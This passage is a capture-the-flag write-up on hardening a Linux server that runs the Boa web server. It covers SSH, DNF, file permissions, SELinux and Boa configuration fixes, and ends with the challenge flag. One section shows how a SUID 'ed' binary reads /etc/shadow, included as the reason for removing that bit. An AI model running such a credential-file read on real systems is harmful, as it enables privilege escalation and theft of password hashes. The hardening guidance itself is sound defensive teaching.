<br> Additionally, the authentication spoofing and authentication data verification and substitution occur on the client side. The security risk of using X11 forwarding is that the client's X11 display server maybe exposed to attack when the SSH client requests forwarding
<br>
Save the configuration changes we made to get points!
<br>![Alt text](2023-08-02_22-21.png)<br>


## SSH password authentication disabled - 1 pts

Now we have our ReadMe specified appsec vuln for SSH.
<br>
It exceedingly simple if you just follow the ReadMe.
<br>![Alt text](2023-08-02_22-22.png)<br>
It wants us to force the users to only login through public key authentication.
<br>
To do this we must:
 * disable password authentication
 * enable public key authentication
<br>

To do this, add the lines `PubkeyAuthentication yes` and `PasswordAuthentication no` to `/etc/ssh/sshd_config`
<br>![Alt text](2023-08-02_22-25.png)<br>
Save the configuration changes and we will get points for disallowing users to login with passwords.
<br>

## Fortune command added to CGI binaries directory - 3 pts

This was anther vuln specified by the ReadMe expect this time it has to do with the critical service "boa".
<br>
The ReadMe states:
```text
We are experiencing some problems with the /cgi-bin/quest endpoint, as it should display text from the fortune command.
This does not seem to be functional. Please investigate this, and ensure that the website is functional. Do not edit
the CGI script itself. The CGI scripts must remain exactly as-is.
```
<br>
There is a web server running CGI bins. Because the CGI bin configurations are normally specified by the web server, we will check the boa configuration file located at `/etc/boa/boa.conf`
<br>
In the boa configuration file, we see two references to CGI bins:
<br>

![Alt text](2023-08-02_22-35.png)
<br>
CGI bins can't run system binaries that are not specifically specified and sandboxed so the `CGIPath` variable states where the binaries that cgi bins can run are stored.
<br>
Because the CGI bin "quest" isn't able to run a command, this is a good place to start.
<br>
Before we do that however, lets make sure that the quest cgi bin and the fortune command are both working and good.
<br>

![Alt text](2023-08-02_22-39.png)
<br>
The CGI bin and the "fortune" command both are what they are intended to be.
<br>
Now lets check the "/var/www/sandbox" directory.
<br>

![Alt text](2023-08-02_22-41.png)
<br>
Sure enough, the two other binaries we need are present but the "fortune" binary isn't.
<br>
Lets copy over the fortune binary into the sandbox directory.
<br>

![Alt text](2023-08-02_22-42.png)
<br>
After doing that, the CGI bin "quest" can now run the fortune command as intended.
<br>

## DNF package manager GPG check globally enabled - 3 pts

This vuln is as it seems, a DNF configuration change.
<br>
Because we are using DNF as our package manager, we want to make sure it is secure.
<br>
It is often over looked in many companies and personal endeavors, but to be secure, you must secure everything.
<br>
Let's look at the dnf configuration file located at `/etc/dnf/dnf.conf`
<br>
It isn't very big so it is easy to digest.
<br>

![Alt text](2023-08-02_22-47.png)
<br>
We see that `gpgcheck` is set to "False".
<br>
This means that an RPM package's signature is not checked prior to installation, allowing malicious packages to be installed instead.<br>
This is set to "True" by default and should be changed immediately if set to "False"
<br>
To do this, simply change `gpgcheck=False` to `gpgcheck=True` in `/etc/dnf/dnf.conf`
<br>

![Alt text](2023-08-02_22-50.png)
<br>
Now save the file and the vulnerability should be remediated!

<br>

## Fixed insecure permissions on passwd file - 3 pts

This vulnerability is very common and compromises the security of a system by allowing unprivileged users to read or write to a file that they shouldn't.
<br>
To check for unprivileged users and groups owning configuration and system files located in `/etc`, run the command `ls -l /etc/ | awk '{print $3":"$4,$9}' | grep -v "^root:root" | grep -v "^:"`\
<br>

![Alt text](2023-08-02_22-57.png)
<br>
This shows that the file 'cups' is owned by the group 'lp', which is an administrator group and is default.
<br>
However it also shows that the file "/etc/passwd", an important file specifying users on the system, is owned by the group "galadriel".
<br>
This means that the unprivileged users in that group are able to write to that file, allowing privilege escalation.
<br>
Change this with the command `chown root:root /etc/passwd`
<br>
This successfully remediates this vulnerability.
<br>

## Fixed insecure permissions on boa.conf - 3 pts

Next is another file permission issue. This time with our web server's configuration file.
<br>
In our last vulnerability, we checked for unprivileged users and groups owning configuration and system files located in `/etc`
<br>
This left the vulnerabilities pertaining to file permissions wide open by only checking for file owners.
<br>
We also neglected to check for files in subdirectories, which most configuration files are.
<br>
Lets fix this last gap first.
<br>
To check for all non-root file owners in "/etc" and its subdirecotries, run the command `find /etc/ -exec ls -l {} \; | awk '{print $3":"$4,$9}' | grep -v "^root:root" | grep -v "^:"`
<br>

![Alt text](2023-08-02_23-04.png)

<br>
As previously specified, the group "lp" is default and an administrator group.
<br>
The groups "openvpn" and "polkitd" are both default too and are only owned by their respective configuration files.
<br>

Now lets check for file permissions in "/etc/" and its subdirectories.
<br>

To check for all world writeable files in /etc (a big vulnerability in configuration files, allowing unprivileged users to change system settings),
run the command `find /etc/ -type f -perm /o+w`
<br>

![Alt text](2023-08-02_23-10.png)
<br>
We see a lot of SSH stuff, which isn't secure, but also doesn't stick out.
<br>
However the boa configuration file being world writable is very insecure.
This allows any user to change the very essence of our public facing web server.
<br>
To fix this, run the command `chmod 644 /etc/boa/boa.conf`
<br>
This only allows the owner of the file, root, to write to it.
<br>

![Alt text](2023-08-02_23-14.png)
<br>

This fixes the glaring vulnerability and scores us points!

<br>

## Public files directory has the sticky bit set - 3 pts

This is another thing the ReadMe asks us to do.
<br>
It states, 
```text
In addition to the CGI content and main webpage, the web server is authorized to serve the folder /var/www/html/files/ as a
public data directory. Ensure that all users can read and write to their own files in this folder.
```
<br>
This is very straight forward, we simply need to allow users to read and write to files owned by them in that directory.
<br>
To do this, we will use a add a sticky bit to the file permissions on that directory. 
<br>
When the sticky bit is set, only the user that owns, the user that owns the directory, or the root user can delete files within the directory.
<br>
This serves our purposes perfectly.
<br>
To set a stick bit, run the command `chmod +t /var/www/html/files`
<br>

![Alt text](2023-08-02_23-19.png)
<br>
This fixes what the ReadMe asks of us and therefore scores us points!

<br>

## Boa binary is owned by root - 3 pts

This next vuln is a file permission issue, but unlike the others that existed in "/etc/" and were system or configuration file issues, this one exists with a system binary.
<br>
To check for weak file permissions on system binaries, we will run a nearly identical command to the one we did before.
<br>
Run the command, `ls -l /bin/ | awk '{print $3":"$4,$9}' | grep -v "^root:root" | grep -v "^:"`

<br>

![Alt text](2023-08-02_23-22.png)
<br>
We see that although two binaries are owned by root and their respective groups, one is owned by a low privilege user and group "frodo"
<br>
This allows frodo to change the binary file that runs our systems web server.
<br>
To remediate this issue, change the file ownership of the boa binary to the user and group "root".
<br>
Run the command `chown root:root /bin/boa`
<br>

![Alt text](2023-08-02_23-24.png)
<br>
We see that now our http server's binary is now owned by root and cannot be tampered with!

<br>

## Removed SUID bit from ed - 3 pts

This is a very common vulnerability that can be exploited to get root access to a system.
<br>
SUID bits enable a user to run a binary with the permissions of that binaries owner. Meaning that a binary owned by root can be ran as a normal user with root permissions.<br>
In many cases, this allows privilege escalation.
<br>
First lets search for files with an SUID bit set.
<br>
To do this, run the command `find / -perm -4000 2>/dev/null`
<br>

![Alt text](2023-08-02_23-30.png)
<br>
This has a lot of output due to some system binaries requiring them.
<br>
However one sticks out, `/usr/bin/ed`
<br>
'ed' is a text editor and has no reason to need root permissions to run.
<br>
To exploit this, one can simply run the command `ed FILE_ONLY_ROOT_SHOULD_READ`
then `,p` (for more on this, read GTFObins https://gtfobins.github.io/gtfobins/ed/)
<br>

![Alt text](2023-08-02_23-34.png)
<br>
Using this, we can read the file /etc/shadow.
<br>
To fix this glaring vulnerability, run the command `chmod -s /usr/bin/ed`
<br>

![Alt text](2023-08-02_23-36.png)
<br>
Doing so remediates the vulnerability and gets us points

<br>

## GRUB configuration is not world readable - 2 pts

This, along with many of our previous vulns, is an issue with file permissions, Now specifically with a configuration file being world readable.
<br>
Before, however, we only checked the "/etc/" directory for world *writeable* files
<br>
To search the whole file system (excluding /proc due to many non-insecure world writable files and /etc due to us previously checking it), run the command `find /  -type f -perm /o+w 2>/dev/null | grep -v "/proc" | grep -v "^/etc"`
<br>
In this case, the grub configuration file should not be world writable OR world readable but due to narrowing down our search and looking for files with many more perms than they should have, we narrowed it down to only world writable files
<br>

![Alt text](2023-08-02_23-41.png)
<br>
Doing so outputs a configuration file for the GRUB bootloader located in the "/boot" directory.
<br>
This sets the settings for our systems bootloader which is responsible for loading and transferring control to the operating system kernel software.
<br>
We  don't want this to be world readable because a normal user has no use or need to read this file.
<br>
To fix this, run the command `chmod 600 /boot/grub2/grub.cfg`
<br>

![Alt text](2023-08-02_23-51.png)
<br>
This fixes our vulnerability by giving non-root users no permissions this file.
<br>

## SELinux enabled and set to enforcing - 3 pts

SELinux is a Linux kernel security module that provides a mechanism for supporting access control security policies, including mandatory access controls.
<br>
This is a very good security tool to have configured and enforcing.
<br>
To see if its enabled and enforcing, run the command `sestatus`
<br>

![Alt text](2023-08-02_23-57.png)
<br>
In this case, we see that is in fact disabled.
<br>
As previously stated, this is not a good security practice.
<br>
To enable it and make sure it is enforcing the settings, edit the file `/etc/selinux/config`
<br>
Change the variable `SELINUX=disabled` to `SELINUX=enforcing`
<br>

![Alt text](2023-08-02_23-59.png)
<br>

Save the file, reboot the system with the command `reboot`, and now it is set to enforcing!
<br>

## User processes are killed on logout - 3 pts

This is a slightly obscure and uncommon vuln and is definitely the hardest one in the image.
<br>
If you check the file `/etc/systemd/logind.conf`, you see that all its configurations are commented out, which is default.
<br> 

![Alt text](2023-08-03_00-03.png)
<br>
However this is not best security practice.
<br>
Specifically the variable `KillUserProcesses`. This configures whether the processes of a user should be killed when the user logs out. If true, the scope unit corresponding to the session and all processes inside that scope will be terminated.
<br>
Not only is this set to `no` when according to the docs, it should default to `yes`, but it is also commented out.
<br>
To fix this uncomment it and change it to `yes` and uncomment the two supporting configuration options below it too.
<br>

![Alt text](2023-08-03_00-07.png)
<br>
Doing so complies with security best practice as well as gets us points.

<br>

## Boa port set correctly - 2 pts

Our last vulns are boa web server related.
<br>
This one specifically has to do with complying with what the ReadMe specifies.
<br>
According to the ReadMe, `The web server should run the Boa web server, and serve HTTP on port 80.`
<br>
Lets check the boa configuration file located at `/etc/boa/boa.conf` to make sure this is set correctly.
<br>

![Alt text](2023-08-03_00-12.png)
<br>
As we can see, it is in fact not set to run on Port 80 and instead is set to run on port "8080".
<br>
To fix this, change it to say `Port 80`, save the file, and get points.
<br>

## Boa runs as the nobody user - 3 pts

These next vulns will come from security best practices with the boa configuration file
<br>
![Alt text](2023-08-03_00-15.png)
<br>
Checking the boa web server docs, we see that we should be running as the user and group "nobody"
<br>
Lets check our boa configuration file to make sure this is the case.
<br>
![Alt text](2023-08-03_00-16.png)
<br>
As we see, it is set to the user "frodo" and the administrator group "wheel"
<br>
Change this to the user and group nobody.
<br>
![Alt text](2023-08-03_00-17.png)
<br>
Save the file and get points!

<br>


## Boa default MIME type is text/plain - 3 pts

The final vulnerability is, as previously stated, also a boa web server best practice.
<br>
Checking all the boa configurations with the command `cat /etc/boa/boa.conf | grep -v "^#" | grep . --color=none` shows us all our active configurations for the boa web server.
<br>
Reading through the docs located at http://www.boa.org/documentation/boa-2.html
can give us an idea of potentially vulnerable settings.
<br>
We see in the docs that the "DefaultType" configuration sets the MIME type used if the file extension is unknown, or there is no file extension.
<br>
In our boa configuration file, this is set to `DefaultType text/html`
<br>
![Alt text](2023-08-03_00-28.png)
<br>
This is a risk because it allows any file with an unknown or no extension to run html code.
<br>
We can check the default configuration file at https://github.com/gpg/boa/blob/master/examples/boa.conf (which also reveals our other configuration vulnerabilities)
<br>
We see that the "DefaultType" is set to "text/plain"
<br>
Lets make this change in our boa.conf file.
<br>

![Alt text](2023-08-03_00-27.png)
<br>
Save the file and we get our flag!
<br>

![Alt text](2023-08-03_00-29.png)
<br>

### **ictf{0ne_d0es_n0t_simply_walk_int0_m0rd0r_but_y0u_did_1f5319db}**

